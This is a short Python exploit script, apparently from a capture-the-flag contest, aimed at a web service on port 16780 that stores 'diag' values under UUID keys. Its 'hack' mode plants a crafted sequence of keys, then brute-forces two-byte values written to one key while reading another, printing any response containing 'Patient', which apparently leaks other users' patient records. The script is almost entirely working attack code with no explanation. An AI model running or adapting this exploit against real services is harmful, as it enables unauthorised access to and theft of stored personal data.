#!/usr/bin/env python3

import requests
import traceback
import random
import string
import time
import sys
import struct
import subprocess

from bs4 import BeautifulSoup

hostname = sys.argv[1]

def put(key, value):
    url = "http://" + hostname + ":16780/" + key;
    response = requests.post(url, data = b"diag=" + value, allow_redirects = False)
    key = response.headers['Location'][1:]
    #print("Saved value " + str(value) + " @ " + key)

def get(key):
    url = "http://" + hostname + ":16780/" + key
    response = requests.get(url)
    soup = BeautifulSoup(response.text, features="html.parser")
    diag = soup.find(id="diag")
    return diag.text

cmd = sys.argv[2]

if cmd == 'put':
    put(sys.argv[3], sys.argv[4].encode('ascii'))

if cmd == 'hack':
    put("31300000-0000-0000-0000-000000000000", b"x")
    put("312f0000-0000-0000-0000-000000000000", b"x")
    put("312ff000-0000-0000-0000-000000000000", b"x")
    put("312fff00-0000-0000-0000-000000000000", b"x")
    put("312ffe00-0000-0000-0000-000000000000", b"x")
    put("312ffef0-0000-0000-0000-000000000000", b"x")
    put("312ffeef-0000-0000-0000-000000000000", b"x")
    put("312ffeee-f000-0000-0000-000000000000", b"x")
    put("312ffeee-ee00-0000-0000-000000000000", b"x")
    put("312ffeee-ef00-0000-0000-000000000000", b"x")
    put("312ffeee-efff-0000-0000-000000000000", b"x")
    put("312ffeee-effe-0000-0000-000000000000", b"x")

    for i in range(2048, 11500):
        val = struct.pack("H", i)
        if b'\x00' in val:
            continue
        put("7fffffff-0000-0000-0000-000000000000", val);
        result = get("312ffeee-effe-f000-0000-000000000000");
        if "Patient" in result:
            print(result.split()[1])